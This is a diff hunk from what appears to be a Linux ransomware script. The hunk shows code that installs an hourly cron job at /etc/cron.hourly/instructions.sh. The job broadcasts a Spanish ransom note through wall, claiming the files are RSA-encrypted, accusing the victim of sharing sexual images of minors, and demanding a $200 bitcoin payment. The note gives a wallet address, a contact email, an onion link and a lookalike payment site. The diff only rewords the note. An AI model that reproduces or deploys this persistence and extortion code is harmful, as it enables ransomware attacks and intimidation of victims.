@@ -277,7 +277,7 @@ done
   echo -e "\n"
   echo -e "wallCmd=\$(which wall)"
   echo -e "\n"
-  echo -e "echo -e \"MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096. El mail para contadtar es Viphops3r@protonmail.ch Si está leyendo este texto, es porque has compartido fotos de menores en los foros de la DarkWeb. Para saber lo que tienes que hacer tienes que descargar el TOR, y visitar esa página; http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/ https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 200$ A ESTA WALLET; 1CXWnfYhYS65SbNQJcrx32Hm3XHVQnof3e  SI NO PAGAS EN 48 HORAS, OLVIDATE PARA EL RESTO DE TU VIDA VER PORNOGRAFIA INFANTIL. forever.\\n\\nIMPORTANT: F CUIDATE MI HERMANO, DE LOS ERRORES SE APRENDE.\" | \${wallCmd}"
+  echo -e "echo -e \"MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096. El mail para contadtar es Viphops3r@protonmail.ch Si está leyendo este texto, es porque has compartido fotos sexuales de menores en los foros de la DarkWeb. Para saber lo que tienes que hacer, tienes que descargar el TOR, y visitar esa página; http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/  https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 200$ A ESTA WALLET; 1CXWnfYhYS65SbNQJcrx32Hm3XHVQnof3e  SI NO PAGAS EN 48 HORAS, OLVIDATE PARA EL RESTO DE TU VIDA VER PORNOGRAFIA INFANTIL. forever.\\n\\nIMPORTANT: F CUIDATE MI HERMANO, DE LOS ERRORES SE APRENDE.\" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
